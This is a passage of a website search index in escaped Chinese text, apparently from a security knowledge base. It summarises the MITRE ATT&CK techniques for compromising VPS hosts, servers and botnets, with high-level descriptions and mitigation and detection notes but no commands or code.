\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1584-003 https://attack.mitre.org/techniques/T1584/003/","title":"T1584-003-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-003-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#t1584-003-","text":"","title":"T1584-003-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-003-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d7\u53d6\u7b2c\u4e09\u65b9\u7684\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff08VPS\uff09\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u53ef\u4ee5\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5404\u79cd\u4e91\u670d\u52a1\u63d0\u4f9b\u5546\u5c06\u865a\u62df\u673a\u6216\u5bb9\u5668\u4f5c\u4e3a\u4e00\u79cd\u670d\u52a1\u51fa\u552e\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u76d7\u53d6\u7531\u7b2c\u4e09\u65b9\u5b9e\u4f53\u8d2d\u4e70\u7684VPS\uff0c\u4f5c\u4e3a\u57fa\u7840\u8bbe\u65bd\u7684VPS\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u5176\u96be\u4ee5\u5728\u7269\u7406\u4e0a\u5c06\u884c\u52a8\u4e0e\u81ea\u5df1\u8054\u7cfb\u8d77\u6765\u3002 \u76d7\u53d6VPS\u7528\u4e8e\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u540e\u671f\u9636\u6bb5\uff0c\u5982\u6307\u6325\u548c\u63a7\u5236\uff0c\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u53d7\u76ca\u4e8e\u4e0e\u66f4\u9ad8\u58f0\u8a89\u7684\u4e91\u670d\u52a1\u63d0\u4f9b\u5546\u76f8\u5173\u7684\u666e\u904d\u6027\u548c\u4fe1\u4efb\uff0c\u4ee5\u53ca\u53d7\u611f\u67d3\u7684\u7b2c\u4e09\u65b9\u589e\u52a0\u7684\u4fe1\u4efb\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-003-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_1","text":"\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff08\u82f1\u8bed\uff1aVirtual private server\uff0c\u7f29\u5199\u4e3a VPS\uff09\uff0c\u662f\u5c06\u4e00\u53f0\u670d\u52a1\u5668\u5206\u5272\u6210\u591a\u4e2a\u865a\u62df\u4e13\u4eab\u670d\u52a1\u5668\u7684\u670d\u52a1\u3002\u5b9e\u73b0VPS\u7684\u6280\u672f\u5206\u4e3a\u5bb9\u5668\u6280\u672f\u548c\u865a\u62df\u673a\u6280\u672f \u3002\u5728\u5bb9\u5668\u6216\u865a\u62df\u673a\u4e2d\uff0c\u6bcf\u4e2aVPS\u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51IP\u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u5b9e\u73b0\u4e0d\u540cVPS\u95f4\u78c1\u76d8\u7a7a\u95f4\u3001\u5185\u5b58\u3001CPU\u8d44\u6e90\u3001\u8fdb\u7a0b\u548c\u7cfb\u7edf\u914d\u7f6e\u7684\u9694\u79bb\uff0c\u4e3a\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\u6a21\u62df\u51fa\u201c\u72ec\u5360\u201d\u4f7f\u7528\u8ba1\u7b97\u8d44\u6e90\u7684\u4f53\u9a8c\u3002VPS\u53ef\u4ee5\u50cf\u72ec\u7acb\u670d\u52a1\u5668\u4e00\u6837\uff0c\u91cd\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u670d\u52a1\u5668\u3002VPS\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u7ba1\u7406\u914d\u7f6e\u7684\u81ea\u7531\uff0c\u53ef\u7528\u4e8e\u4f01\u4e1a\u865a\u62df\u5316\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8eIDC\u8d44\u6e90\u79df\u7528\u3002 IDC\u8d44\u6e90\u79df\u7528\uff0c\u7531VPS\u63d0\u4f9b\u5546\u63d0\u4f9b\u3002\u4e0d\u540cVPS\u63d0\u4f9b\u5546\u6240\u4f7f\u7528\u7684\u786c\u4ef6VPS\u8f6f\u4ef6\u7684\u5dee\u5f02\uff0c\u53ca\u9500\u552e\u7b56\u7565\u7684\u4e0d\u540c\uff0cVPS\u7684\u4f7f\u7528\u4f53\u9a8c\u4e5f\u6709\u8f83\u5927\u5dee\u5f02\u3002\u5c24\u5176\u662fVPS\u63d0\u4f9b\u5546\u8d85\u5356\uff0c\u5bfc\u81f4\u5b9e\u4f53\u670d\u52a1\u5668\u8d85\u8d1f\u8377\u65f6\uff0cVPS\u6027\u80fd\u5c06\u53d7\u5230\u6781\u5927\u5f71\u54cd\u3002\u76f8\u5bf9\u6765\u8bf4\uff0c\u5bb9\u5668\u6280\u672f\u6bd4\u865a\u62df\u673a\u6280\u672f\u786c\u4ef6\u4f7f\u7528\u6548\u7387\u66f4\u9ad8\uff0c\u66f4\u6613\u4e8e\u8d85\u5356\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u5bb9\u5668VPS\u7684\u4ef7\u683c\u90fd\u9ad8\u4e8e\u865a\u62df\u673aVPS\u7684\u4ef7\u683c\u3002 \u8fd9\u4e9bVPS\u4e3b\u673a\u4ee5\u6700\u5927\u5316\u7684\u6548\u7387\u5171\u4eab\u786c\u4ef6\u3001\u8f6f\u4ef6\u8bb8\u53ef\u8bc1\u4ee5\u53ca\u7ba1\u7406\u8d44\u6e90\u3002\u6bcf\u4e2aVPS\u4e3b\u673a\u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51IP\u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u72ec\u7acb\u8d85\u5927\u7a7a\u95f4\u3001\u72ec\u7acb\u5185\u5b58\u3001\u72ec\u7acbCPU\u8d44\u6e90\u3001\u72ec\u7acb\u6267\u884c\u7a0b\u5e8f\u548c\u72ec\u7acb\u7cfb\u7edf\u914d\u7f6e\u7b49\u3002VPS\u4e3b\u673a\u7528\u6237\u53ef\u5728\u670d\u52a1\u5668\u4e0a\u81ea\u884c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u4e3b\u673a\u3002\uff08ps:\u4e0d\u505a\u8fc7\u591a\u4ecb\u7ecd\uff0c\u61c2\u5f97\u90fd\u61c2\uff09","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-003-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-003-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-003-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-003-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-003-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-003-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-003-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-003-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/#_9","text":"MITRE-ATT&CK-T1584-003 https://attack.mitre.org/techniques/T1584/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-004-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/","text":"T1584-004-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-\u670d\u52a1\u5668 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u5219\u53ef\u80fd\u4f1a\u653b\u51fb\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u53ef\u4ee5\u5728\u7784\u51c6\u76ee\u6807\u65f6\u4f7f\u7528\u3002\u4f7f\u7528\u670d\u52a1\u5668\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u7b56\u5212\u3001\u53d1\u52a8\u548c\u6267\u884c\u884c\u52a8\u3002\u5728\u653b\u51fb\u540e\u7684\u6d3b\u52a8\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u670d\u52a1\u5668\u6267\u884c\u5404\u79cd\u4efb\u52a1\uff0c\u5305\u62ec\u7528\u4e8e\u6307\u6325\u548c\u63a7\u5236\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4e0d\u8d2d\u4e70\u670d\u52a1\u5668\u6216\u865a\u62df\u79c1\u4eba\u670d\u52a1\u5668\uff0c\u800c\u662f\u5229\u7528\u81ea\u5df1\u653b\u51fb\u83b7\u53d6\u7684\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\u7528\u4ee5\u652f\u6301\u884c\u52a8\u3002 \u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u653b\u51fbWeb\u52a1\u5668\u4ee5\u652f\u6301\u6c34\u5751\u64cd\u4f5c\uff0c\u5982Drive-by Compromise\u3002 \u6d4b\u8bd5\u6848\u4f8b \u7b80\u5355\u6765\u8bf4\uff1a\u5c31\u662f\u901a\u8fc7\u653b\u51fb\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\uff0c\u4f5c\u4e3a\u8df3\u677f\u673a\uff0c\u4fd7\u79f0\u201c\u8089\u9e21\u201d\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1584-004 https://attack.mitre.org/techniques/T1584/004/","title":"T1584-004-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-\u670d\u52a1\u5668"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-004-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#t1584-004-","text":"","title":"T1584-004-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-\u670d\u52a1\u5668"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-004-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#attck","text":"\u653b\u51fb\u5219\u53ef\u80fd\u4f1a\u653b\u51fb\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u53ef\u4ee5\u5728\u7784\u51c6\u76ee\u6807\u65f6\u4f7f\u7528\u3002\u4f7f\u7528\u670d\u52a1\u5668\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u7b56\u5212\u3001\u53d1\u52a8\u548c\u6267\u884c\u884c\u52a8\u3002\u5728\u653b\u51fb\u540e\u7684\u6d3b\u52a8\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u670d\u52a1\u5668\u6267\u884c\u5404\u79cd\u4efb\u52a1\uff0c\u5305\u62ec\u7528\u4e8e\u6307\u6325\u548c\u63a7\u5236\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4e0d\u8d2d\u4e70\u670d\u52a1\u5668\u6216\u865a\u62df\u79c1\u4eba\u670d\u52a1\u5668\uff0c\u800c\u662f\u5229\u7528\u81ea\u5df1\u653b\u51fb\u83b7\u53d6\u7684\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\u7528\u4ee5\u652f\u6301\u884c\u52a8\u3002 \u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u653b\u51fbWeb\u52a1\u5668\u4ee5\u652f\u6301\u6c34\u5751\u64cd\u4f5c\uff0c\u5982Drive-by Compromise\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-004-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_1","text":"\u7b80\u5355\u6765\u8bf4\uff1a\u5c31\u662f\u901a\u8fc7\u653b\u51fb\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\uff0c\u4f5c\u4e3a\u8df3\u677f\u673a\uff0c\u4fd7\u79f0\u201c\u8089\u9e21\u201d\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-004-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-004-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-004-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-004-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-004-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-004-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-004-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-004-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E6%9C%8D%E5%8A%A1%E5%99%A8/#_9","text":"MITRE-ATT&CK-T1584-004 https://attack.mitre.org/techniques/T1584/004/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-005-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/","text":"T1584-005-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-\u50f5\u5c38\u7f51\u7edc \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u653b\u51fb\u8bb8\u591a\u7b2c\u4e09\u65b9\u7cfb\u7edf\uff0c\u4ee5\u5f62\u6210\u4e00\u4e2a\u50f5\u5c38\u7f51\u7edc\uff0c\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u3002\u50f5\u5c38\u7f51\u7edc\u662f\u4e00\u4e2a\u7531\u88ab\u7834\u574f\u7684\u7cfb\u7edf\u7ec4\u6210\u7684\u7f51\u7edc\uff0c\u53ef\u4ee5\u88ab\u6307\u793a\u6267\u884c\u4e0b\u53d1\u7684\u4efb\u52a1\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u653b\u9677\u8bb8\u591a\u7b2c\u4e09\u65b9\u7cfb\u7edf\u6765\u5efa\u7acb\u81ea\u5df1\u7684\u50f5\u5c38\u7f51\u7edc\uff0c\u800c\u4e0d\u662f\u4ece\u538b\u529b\u6d4b\u8bd5\u670d\u52a1\u5546\u90a3\u91cc\u4e2d\u8d2d\u4e70\u6216\u79df\u7528\u50f5\u5c38\u7f51\u7edc\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u63a5\u7ba1\u73b0\u6709\u7684\u50f5\u5c38\u7f51\u7edc\uff0c\u4f8b\u5982\u5c06\u50f5\u5c38\u91cd\u5b9a\u5411\u5230\u653b\u51fb\u8005\u63a7\u5236\u7684C2\u670d\u52a1\u5668\u3002\u6709\u4e86\u50f5\u5c38\u7f51\u7edc\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8fdb\u884c\u540e\u7eed\u6d3b\u52a8\uff0c\u4f8b\u5982\u5927\u89c4\u6a21\u7f51\u7edc\u9493\u9c7c\u6216\u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1\uff08DDoS\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u7b80\u5355\u7684\u6765\u8bb2\uff1a\u5373\u653b\u51fb\u8005\u81ea\u884c\u7ec4\u5efa\u5c5e\u4e8e\u81ea\u5df1\u7684\u50f5\u5c38\u7f51\u7edc\u7cfb\u7edf\uff0c\u901a\u8fc7\u653b\u51fb\u7b2c\u4e09\u65b9\u7cfb\u7edf\u7684\u624b\u6bb5\u3002 \u50f5\u5c38\u7f51\u7edcBotnet\u662f\u6307\u91c7\u7528\u4e00\u79cd\u6216\u591a\u79cd\u4f20\u64ad\u624b\u6bb5\uff0c\u5c06\u5927\u91cf\u4e3b\u673a\u611f\u67d3bot\u7a0b\u5e8f\uff08\u50f5\u5c38\u7a0b\u5e8f\uff09\u75c5\u6bd2\uff0c\u4ece\u800c\u5728\u63a7\u5236\u8005\u548c\u88ab\u611f\u67d3\u4e3b\u673a\u4e4b\u95f4\u6240\u5f62\u6210\u7684\u4e00\u4e2a\u53ef\u4e00\u5bf9\u591a\u63a7\u5236\u7684\u7f51\u7edc\u3002 \u653b\u51fb\u8005\u901a\u8fc7\u5404\u79cd\u9014\u5f84\u4f20\u64ad\u50f5\u5c38\u7a0b\u5e8f\u611f\u67d3\u4e92\u8054\u7f51\u4e0a\u7684\u5927\u91cf\u4e3b\u673a\uff0c\u800c\u88ab\u611f\u67d3\u7684\u4e3b\u673a\u5c06\u901a\u8fc7\u4e00\u4e2a\u63a7\u5236\u4fe1\u9053\u63a5\u6536\u653b\u51fb\u8005\u7684\u6307\u4ee4\uff0c\u7ec4\u6210\u4e00\u4e2a\u50f5\u5c38\u7f51\u7edc\u3002\u4e4b\u6240\u4ee5\u7528\u50f5\u5c38\u7f51\u7edc\u8fd9\u4e2a\u540d\u5b57\uff0c\u662f\u4e3a\u4e86\u66f4\u5f62\u8c61\u5730\u8ba9\u4eba\u4eec\u8ba4\u8bc6\u5230\u8fd9\u7c7b\u5371\u5bb3\u7684\u7279\u70b9\uff1a\u4f17\u591a\u7684\u8ba1\u7b97\u673a\u5728\u4e0d\u77e5\u4e0d\u89c9\u4e2d\u5982\u540c\u4e2d\u56fd\u53e4\u8001\u4f20\u8bf4\u4e2d\u7684\u50f5\u5c38\u7fa4\u4e00\u6837\u88ab\u4eba\u9a71\u8d76\u548c\u6307\u6325\u7740\uff0c\u6210\u4e3a\u88ab\u4eba\u5229\u7528\u7684\u4e00\u79cd\u5de5\u5177\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\uff08\u53d7\u5bb3\u8005\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u68c0\u6d4b\u8fd9\u79cd\u884c\u4e3a\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u7f51\u7edc\u9493\u9c7c\u3001\u7aef\u70b9\u62d2\u7edd\u670d\u52a1\u6216\u7f51\u7edc\u62d2\u7edd\u670d\u52a1\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1584-005 